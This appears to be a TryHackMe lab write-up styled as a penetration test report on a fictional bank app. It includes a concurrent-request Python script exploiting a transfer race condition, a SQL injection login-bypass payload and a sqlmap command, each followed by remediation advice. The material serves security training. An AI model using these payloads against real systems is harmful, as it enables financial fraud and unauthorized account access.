---
title: "TryBankMe: Black-Box Web Pentest"
category: Web / Penetration Testing
difficulty: Hard
platform: TryHackMe
date: 2026-08-05
tags: [Penetration Testing, Web, SQLi, Race Condition, Report, Hard]
summary: Comprehensive external black-box penetration test for TryBankMe Limited web banking application. Discovered Critical TOCTOU transaction race condition allowing balance manipulation and High unauthenticated SQL injection.
---

# Penetration Test Report: TryBankMe Limited
## External Black-Box Web Application Security Assessment
| **Client** | TryBankMe Limited |
| **Assessment Type** | External Black-Box Penetration Test |
| **Date** | 05 August 2026 |
| **Consultant** | Red Team Consultant (sameekey) |
| **Classification** | CONFIDENTIAL / Client Deliverable |
| **Key Findings** | 1 Critical (TOCTOU Race Condition) • 1 High (Unauthenticated SQL Injection) |

> **TL;DR** — During an authorized external black-box penetration test against TryBankMe's core financial banking platform (`www.trybankme.com`), two severe vulnerabilities were identified. The most critical was a Time-of-Check to Time-of-Use (TOCTOU) race condition in the `/api/transfer` endpoint that enables attackers to execute simultaneous transactions and manufacture unlimited account balances ("infinite money glitch"). Additionally, the `/login` endpoint was found vulnerable to classic unauthenticated SQL injection allowing total administrative dashboard takeover.


## 1. Executive Summary
### 1.1 Overview
Between 01 August 2026 and 05 August 2026, an external black-box security assessment was conducted against the TryBankMe web application infrastructure. The objective was to identify security weaknesses that could be exploited by external adversaries to compromise customer confidentiality, data integrity, or financial assets.

### 1.2 Vulnerability Severity Breakdown
| Severity | Count | Status |
| **Critical** | 1 | Unresolved (Immediate Action Required) |
| **High** | 1 | Unresolved (High Priority) |
| **Low / Info** | 0 | - |

### 1.3 Business Impact & Risk Analysis
- **Direct Financial Loss**: The transaction race condition allows an authenticated attacker to repeatedly withdraw or transfer funds that do not exist, causing direct capital loss to the bank.
- **Account Takeover & Regulatory Exposure**: Unauthenticated SQL injection on the login page exposes the entire customer database and transaction ledgers, resulting in severe regulatory non-compliance (PCI-DSS, GDPR).


## 2. Technical Vulnerability Write-Ups
### Finding 01 — Race Condition in Transaction Handling Allows Balance Manipulation
- **Vulnerability Type**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
- **Risk Rating**: **Critical (CVSS 3.1: 8.6 / High Severity In-Isolation, Critical Business Impact)**
- **Endpoint**: `POST /api/transfer`
- **Authentication**: Required (Valid Customer Session)

#### Technical Details & Root Cause
The fund transfer handler follows a multi-step, non-atomic workflow:
1. Server receives transaction payload (`{"from": 1001, "to": 1002, "amount": 1000}`).
2. Server queries database for current account balance of account `1001`.
3. Server validates that `balance >= amount`.
4. Server deducts `amount` and commits new balance to database.

Because steps 2 and 4 are non-atomic and lack database row locks (`SELECT FOR UPDATE`), sending simultaneous asynchronous requests enables multiple requests to pass validation before the first deduction is recorded:

```http
POST /api/transfer HTTP/1.1
Host: trybankme.com
Content-Type: application/json
Authorization: Bearer <session_token>

{"from": 1001, "to": 1002, "amount": 1000}
```

```python
# Exploitation Proof-of-Concept: Turbo Intruder / Concurrent Thread Pool
import concurrent.futures
import requests

def send_transfer():
    return requests.post("https://trybankme.com/api/transfer", json={"from": 1001, "to": 1002, "amount": 1000})

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = [executor.submit(send_transfer) for _ in range(20)]
```

#### Remediation Advice
- Enforce strict database transaction atomicity: wrap balance verification and deduction inside a single ACID transaction with pessimistic row-level locking (`SELECT ... FOR UPDATE`).
- Introduce an application-level mutex or message queue (e.g., Redis lock or RabbitMQ) per account ID to guarantee sequential processing.


### Finding 02 — Unauthenticated SQL Injection in Authentication Portal
- **Vulnerability Type**: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **Risk Rating**: **High (CVSS 3.1: 8.6)**
- **Endpoint**: `POST /login`
- **Authentication**: Unauthenticated

#### Technical Details & Proof-of-Concept
The login handler concatenates user input directly into backend SQL queries without sanitization or prepared statements:

```http
POST /login HTTP/1.1
Host: trybankme.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username=' OR 1=1--&password=anything
```

The application immediately responded with an `HTTP/1.1 302 Found` redirecting to the administrative dashboard (`/admin/dashboard`), allowing unauthenticated account takeover.

```bash
# Automated validation via SQLmap:
sqlmap -u "https://trybankme.com/login" --data="username=test&password=test" -p username --risk=3 --level=3
```

#### Remediation Advice
- Transition immediately to **Parameterized Queries (Prepared Statements)** across all database communication.
- Implement an Object-Relational Mapping (ORM) framework or parameterized database driver where parameters are separated from query syntax.


## 3. Appendices & Scope of Engagement
### Appendix A — Assessment Scope
- **Target Application**: `https://www.trybankme.com` (Registration, Authentication, and Transfer modules).
- **Coverage**: 100% of defined in-scope web services were tested.
- **Testing Window**: 01 August 2026 – 05 August 2026.

### Appendix B — Artifact Cleanup
- All temporary test accounts created during testing (`pentest_user_01` to `05`) were designated for database purging.
- Proof-of-concept balance modifications were flagged for balance reconciliation in staging.
